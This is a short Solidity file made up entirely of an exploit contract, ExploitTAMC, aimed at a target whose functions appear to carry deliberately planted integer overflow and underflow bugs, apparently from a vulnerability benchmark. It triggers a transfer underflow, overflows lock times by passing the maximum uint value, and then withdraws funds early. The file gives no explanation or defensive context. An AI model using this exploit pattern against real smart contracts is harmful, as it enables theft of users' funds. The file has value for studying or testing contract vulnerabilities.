interface ITAMC {
    function transfer_intou14(address _to, uint _value) external returns (bool);
    function transfer_intou30(address _to, uint _value) external returns (bool);
    function bug_intou8(uint8 p_intou8) external;
    function bug_intou39() external;
    function bug_intou31() external;
    function bug_intou35() external;
    function bug_intou40(uint8 p_intou40) external;
    function increaseLockTime_intou13(uint _secondsToIncrease) external;
    function withdraw_intou13() external;
    function increaseLockTime_intou33(uint _secondsToIncrease) external;
    function withdraw_intou33() external;
}

contract ExploitTAMC {
    ITAMC public target;

    constructor(address _target) {
        target = ITAMC(_target);
    }

    function exploitTransferUnderflow() public {
        target.transfer_intou14(address(this), 1);
    }

    function exploitBugIntou39() public {
        target.bug_intou39();
    }

    function exploitIncreaseLockTimeOverflow() public {
        target.increaseLockTime_intou13(type(uint).max);
    }

    function exploitWithdraw() public {
        target.withdraw_intou13();
    }

    function exploitIncreaseLockTimeOverflow33() public {
        target.increaseLockTime_intou33(type(uint).max);
    }

    function exploitWithdraw33() public {
        target.withdraw_intou33();
    }
}